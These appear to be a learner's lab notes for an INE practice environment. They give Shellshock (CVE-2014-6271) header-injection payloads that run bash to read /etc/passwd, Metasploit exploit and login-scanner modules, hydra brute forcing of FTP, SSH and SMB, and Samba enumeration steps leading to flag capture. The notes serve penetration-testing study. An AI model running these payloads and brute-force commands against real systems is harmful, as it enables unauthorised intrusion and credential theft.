<h1>ShellShock CVE-2014-6271 </h1>
![[Screenshot_2025-09-15_10_55_46.png]]

```
nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
```


![[Screenshot_2025-09-15_10_55_58.png]]
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \ http://localhost:8080/cgi-bin/vulnerable 
```


![[Screenshot_2025-09-15_10_56_09.png]]

![[Screenshot_2025-09-15_10_56_13.png]]

![[Screenshot_2025-09-15_10_56_17.png]]
```
() { :; }; echo; echo; /bin/bash -c 'cat /'
```

![[Screenshot_2025-09-15_10_56_20.png]]
```
() { :; }; echo; echo; /bin/bash -c 'ps -ef'
```
![[Screenshot_2025-09-15_10_56_25.png]]


<h4>Metasploit Method</h4>
```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

<h2>ProFTPd Exploitation</h2>
  
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local -t 4 ftp
```
<h4>Metasploit Method </h4>
```
use auxiliary/scannner/ftp/ftp_login
```

  ```
echo "sysadmin" > users nmap --script ftp-brute --script-args userdb=/root/users -p 21 demo.ine.local
  ```

```
ftp demo.ine.local
"Enter Username"
"Enter Password"

ftp sysadmin@demo.ine.local
"Enter Password"
```

`FTP can be configured to allow anonymous connections.`
`TRUE`

<h2> SSH Exploit </h2>
```
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
exploit
```

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```

```
sessions
sessions -i 1
find / -name "flag"
cat /flag
```

<h2> Samba Exploits </h2>

What is the NetBIOS computer name of samba server? Use appropriate nmap scripts.

```
nmap --script smb-os-discovery.nse -p 445 demo.ine.local
```

What is the samba version using Metasploit?

```
msfconsole -q
use auxiliary/scanner/smb/smb_version
set RHOSTS demo.ine.local
exploit
```

Find the NetBIOS computer name of samba server using nmblookup.

```
nmblookup -A demo.ine.local
```

Using smbclient determine whether anonymous connection (null session) is allowed on the samba server or not.

```
smbclient -L demo.ine.local -N
```

Using rpcclient determine whether anonymous connection (null session) is allowed on the samba server or not.

```
rpcclient -U "" -N demo.ine.local
```


_>What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt_
```
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
set RHOSTS demo.ine.local
exploit
```

_>What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt_
```
gzip -d /usr/share/wordlists/rockyou.txt.gz hydra -l admin -P /usr/share/wordlists/rockyou.txt demo.ine.local smb
```

_> Which share is read only? Use smbmap with credentials_
```
smbmap -H demo.ine.local -u admin -p password1
```

```
smbclient -L demo.ine.local -U jane
```

```
smbclient //demo.ine.local/jane -U jane
```

```
smbclient //demo.ine.local/admin -U admin
ls
cd hidden
ls
get flag.tar.gz
exit
tar -xf flag.tar.gz
cat flag
```

_>List the named pipes available over SMB on the samba server? Use pipe_auditor metasploit module with credentials obtained<_

```
msfconsole -q
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass password1
set RHOSTS demo.ine.local
exploit
```

_>List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling using enum4Linux with credentials_
```
enum4linux -r -u "admin" -p "password1" demo.ine.local
```